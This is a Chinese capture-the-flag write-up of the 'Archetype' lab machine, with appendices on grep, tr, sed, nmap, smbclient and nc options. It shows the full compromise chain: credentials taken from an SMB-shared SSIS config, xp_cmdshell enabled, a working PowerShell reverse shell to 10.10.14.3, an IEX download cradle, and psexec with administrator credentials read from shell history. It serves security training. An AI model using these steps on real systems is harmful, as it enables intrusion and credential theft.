# Archetype

## 环境与准备

- 下载openvpn配置文件并使用该文件配置启动openvpn
- 给定目标机IP地址`10.10.10.27`

## 信息搜集

```sh
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.27
```

### 端口信息

```txt
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-03-07T23:45:45
|_Not valid after:  2051-03-07T23:45:45
|_ssl-date: 2021-03-08T04:32:38+00:00; +1h17m22s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h53m22s, deviation: 3h34m40s, median: 1h17m21s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-07T20:32:23-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-08T04:32:27
|_  start_date: N/A
```

发现目标机445端口（对应SMB协议）和1433端口（对应mssql）开放。

### 共享文件导致敏感信息泄露

文件共享经常会将敏感配置文件暴露出来，使用`smbclient`检查能否匿名登录以及查看共享的文件

发现backups目录

```sh
┌──(root💀kali)-[/]
└─# smbclient -N -L \\\\10.10.10.27\\    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

目录下发现`prod.dtsConfig`，dtsconfig是SSIS服务的配置文件，通常包含敏感信息；SSIS是Microsoft SQL Server Integration Services的简称，是生成高性能数据集成解决方案（包括数据仓库的提取、转换和加载 (ETL) 包）的平台。

```sh
┌──(root💀kali)-[/]
└─# smbclient -N \\\\10.10.10.27\\backups  
Try "help" to get a list of possible commands.
smb: \> dir
  .                      D        0  Mon Jan 20 20:20:57 2020
  ..                     D        0  Mon Jan 20 20:20:57 2020
  prod.dtsConfig        AR      609  Mon Jan 20 20:23:02 2020

                10328063 blocks of size 4096. 8259462 blocks available
```

下载`prod.dtsConfig`

```sh
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

查看`prod.dtsConfig`

```sh
┌──(root💀kali)-[/]
└─# cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```

从中发现用户名`ARCHETYPE\sql_svc`和密码`M3g4c0rp123`

## 数据库

利用[工具脚本](https://github.com/SecureAuthCorp/impacket)尝试使用发现的用户名密码登录到mssql，并调用`IS_SRVROLEMEMBER`函数获取当前用户是否为sysadmin权限

```sh
┌──(root💀kali)-[/]
└─# mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.23.dev1+20210302.130123.df00d15c - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
              

-----------   

          1 
```

发现用户确实拥有最高权限，下一步配置开启`xp_cmdshell`并远程执行命令

```mssql
EXEC sp_configure "Show Advanced options", 1;
reconfigure;
sp_configure;
EXEC sp_configure "xp_cmdshell", 1;
reconfigure;
xp_cmdshell "whoami"
```

## 远程代码执行

### 准备shell

通过whoami命令可以看到当前登录的用户并没有管理员权限，创建`shell.ps1`

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "# ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()
```

### shell连接配置

- python启动一个极简版的http服务器`python3 -m http.server 80`
- 使用`nc -lnvp 443`监听443端口（`shell.ps1`要连接的端口）
- 配置防火墙，允许本机80和443端口被目标机shell连接`ufw allow from 10.10.10.27 proto tcp to any p[ort 80,443`

### shell连接

执行`xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");`

### 权限提升

执行`type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`以访问powershell命令历史记录，发现机器使用者以administrator身份开启`backups`文件夹的共享，并得知administrator的密码

使用工具脚本`psexec.py`获取一个高权限shell，`psexec.py administrator@10.10.10.27`

最后登入目标机，找到flag即可（位于administrator桌面）

## 附录A grep命令正则表达式、扩展正则表达式

- 把正则再次记录一下，方便以后翻阅查找
- 匹配字符
  - `.` ：任意一个字符。
  - `[abc]` ：表示匹配一个字符，这个字符必须是abc中的一个
  - `[a-zA-Z]` ：表示匹配一个字符，这个字符必须是a-z或A-Z这52个字母中的一个
  - `[^123]` ：匹配一个字符，这个字符是除了1、2、3以外的所有字符。
  - 对于一些常用的字符集，系统做了定义：
  - `[A-Za-z]` 等价于 `[[:alpha:]]`
  - `[0-9]` 等价于 `[[:digit:]]`
  - `[A-Za-z0-9]` 等价于 `[[:alnum:]]`
  - tab,space 等空白字符 `[[:space:]]`
  - `[A-Z]` 等价于 `[[:upper:]]`
  - `[a-z]` 等价于 `[[:lower:]]`
  - 标点符号 `[[:punct:]]`
- 匹配次数：
  - `\{m,n\}` ：匹配其前面出现的字符至少m次，至多n次。
  - `\?` ：匹配其前面出现的内容0次或1次，等价于`\{0,1\}`。
  - `*` ：匹配其前面出现的内容任意次，等价于`\{0,\}`，所以 `.*` 表述任意字符任意次，即无论什么内容全部匹配
- 位置锚定：
  - `^` ：锚定行首
  - `$` ：锚定行尾。技巧：`^$`用于匹配空白行。
  - `\b`或`\<`：锚定单词的词首。如"\blike"不会匹配alike，但是会匹配liker
  - `\b`或`\>`：锚定单词的词尾。如"\blike\b"不会匹配alike和liker，只会匹配like
  - `\B` ：与\b作用相反
- 分组及引用：
  - `\(string\)` ：将string作为一个整体方便后面引用
  - `\1` ：引用第1个左括号及其对应的右括号所匹配的内容
  - `\2` ：引用第2个左括号及其对应的右括号所匹配的内容
  - `\n` ：引用第n个左括号及其对应的右括号所匹配的内容
- 扩展-匹配字符：这部分和基本正则表达式一样
- 扩展-匹配次数：
  - `*` ：和基本正则表达式一样
  - `?` ：基本正则表达式是`\?`，二这里没有`\`
  - `{m,n}` ：相比基本正则表达式也是没有了`\`
  - `+` ：匹配其前面的字符至少一次，相当于`{1,}`
- 扩展-位置锚定：和基本正则表达式一样。
- 扩展-分组及引用：
  - `(string)` ：相比基本正则表达式也是没有了`\`
  - `\1` ：引用部分和基本正则表达式一样
  - `\n` ：引用部分和基本正则表达式一样

## 附录B tr命令字符集合范围

- `\NNN` 八进制值的字符 NNN (1 to 3 为八进制值的字符)
- `\\` 反斜杠
- `\a Ctrl-G` 铃声
- `\b Ctrl-H` 退格符
- `\f Ctrl-L` 走行换页
- `\n Ctrl-J` 新行
- `\r Ctrl-M` 回车
- `\t Ctrl-I` tab键
- `\v Ctrl-X` 水平制表符
- `CHAR1-CHAR2` ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。
- `[CHAR*]` ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止
- `[CHAR*REPEAT]` ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)
- `[:alnum:]` ：所有字母字符与数字
- `[:alpha:]` ：所有字母字符
- `[:blank:]` ：所有水平空格
- `[:cntrl:]` ：所有控制字符
- `[:digit:]` ：所有数字
- `[:graph:]` ：所有可打印的字符(不包含空格符)
- `[:lower:]` ：所有小写字母
- `[:print:]` ：所有可打印的字符(包含空格符)
- `[:punct:]` ：所有标点字符
- `[:space:]` ：所有水平与垂直空格符
- `[:upper:]` ：所有大写字母
- `[:xdigit:]` ：所有 16 进位制的数字
- `[=CHAR=]` ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)

## 附录C 文本处理命令说明

- `grep`：后接基本正则表达式来匹配要查找的字符串
  - 使用扩展的正则匹配需要使用`-E`参数
- `cut`:从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出
  - `-b` ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 `-n` 标志
  - `-c` ：以字符为单位进行分割
  - `-d` ：自定义分隔符，默认为制表符
  - `-f` ：与`-d`一起使用，指定显示哪个区域，序号从1开始计数
  - `-n` ：取消分割多字节字符。仅和 `-b` 标志一起使用。如果字符的最后一个字节落在由 `-b` 标志的 List 参数指示的范围之内，该字符将被写出；否则，该字符将被排除
- `tr`: 转换或删除文件中的字符
  - `tr [OPTION]…SET1[SET2]`
  - -c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换
  - -d, --delete：删除指令字符
  - -s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符
  - -t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等
- `sed`：依照脚本的指令来处理、编辑文本文件
  - `sed [-hnV][-e<script>][-f<script文件>][文本文件]`
  - `-e<script>`或`--expression=<script>` 以选项中指定的script来处理输入的文本文件
  - `-f<script文件>`或`--file=<script文件>` 以选项中指定的script文件来处理输入的文本文件
  - `-n`或`--quiet`或`--silent` 仅显示script处理后的结果
  - 动作说明：
    - `a` ：新增， `a` 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)
    - `c` ：取代， `c` 的后面可以接字串，这些字串可以取代 n1,n2 之间的行
    - `d` ：删除
    - `i` ：插入， `i` 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)
    - `p` ：打印，亦即将某个选择的数据印出。通常 `p` 会与参数 `sed -n` 一起运行
    - `s` ：取代，通常这个 `s` 的动作可以搭配正则表达式。`sed s/pattern1/pattern2/`按p1匹配，按p2替换

## 附录D nmap命令说明

- `-p-`:扫描0-65535端口
- `--min-rate <number>`:每秒发送数据包不少于`<number>`次
- 时序
  - `-T0`  非常非常慢，用于IDS逃逸
  - `-T1`  相当慢，用于IDS逃逸
  - `-T2`  降低速度以消耗更小的带宽，比默认慢十倍
  - `-T3`  默认，根据目标的反应自动调整时间模式
  - `-T4`  假定处在一个很好的网络环境，请求可能会淹没目标
  - `-T5`  非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口
- `-sC`：运行默认脚本
- `-sV`：系统版本检测
- `-p`：指定端口，端口范围用`-`连接，端口列表用`,`分隔

## 附录E smbclient命令说明

- 格式：`smbclient [网络资源][密码][-EhLN][-B<IP地址>][-d<排错层级>][-i<范围>][-I<IP地址>][-l<记录文件>][-M<NetBIOS名称>][-n<NetBIOS名称>][-O<连接槽选项>][-p<TCP连接端口>][-R<名称解析顺序>][-s<目录>][-t<服务器字码>][-T<tar选项>][-U<用户名称>][-W<工作群组>]`
- 参数
  - `[网络资源]` `[网络资源]`的格式为`//服务器名称/资源分享名称`。
  - `[密码]` 输入存取网络资源所需的密码。
  - `-B<IP地址>` 传送广播数据包时所用的IP地址。
  - `-d<排错层级>` 指定记录文件所记载事件的详细程度。
  - `-E` 将信息送到标准错误输出设备。
  - `-h` 显示帮助。
  - `-i<范围>` 设置NetBIOS名称范围。
  - `-I<IP地址>` 指定服务器的IP地址。
  - `-l<记录文件>` 指定记录文件的名称。
  - `-L` 显示服务器端所分享出来的所有资源。
  - `-M<NetBIOS名称>` 可利用WinPopup协议，将信息送给选项中所指定的主机。
  - `-n<NetBIOS名称>` 指定用户端所要使用的NetBIOS名称。
  - `-N` 不用询问密码。
  - `-O<连接槽选项>` 设置用户端TCP连接槽的选项。
  - `-p<TCP连接端口>` 指定服务器端TCP连接端口编号。
  - `-R<名称解析顺序>` 设置NetBIOS名称解析的顺序。
  - `-s<目录>` 指定smb.conf所在的目录。
  - `-t<服务器字码>` 设置用何种字符码来解析服务器端的文件名称。
  - `-T<tar选项>` 备份服务器端分享的全部文件，并打包成tar格式的文件。
  - `-U<用户名称>` 指定用户名称。
  - `-W<工作群组>` 指定工作群组名称。

## 附录F nc命令说明

- 格式：`nc [-hlnruz][-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>][-p<通信端口>][-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]`
- 参数
  - `-g<网关>` 设置路由器跃程通信网关，最多可设置8个。
  - `-G<指向器数目>` 设置来源路由指向器，其数值为4的倍数。
  - `-i<延迟秒数>` 设置时间间隔，以便传送信息及扫描通信端口。
  - `-l` 使用监听模式，管控传入的资料。
  - `-n` 直接使用IP地址，而不通过域名服务器。
  - `-o<输出文件>` 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
  - `-p<通信端口>` 设置本地主机使用的通信端口。
  - `-r` 乱数指定本地与远端主机的通信端口。
  - `-s<来源位址>` 设置本地主机送出数据包的IP地址。
  - `-u` 使用UDP传输协议。
  - `-v` 显示指令执行过程。
  - `-w<超时秒数>` 设置等待连线的时间。
  - `-z` 使用0输入/输出模式，只在扫描通信端口时使用。
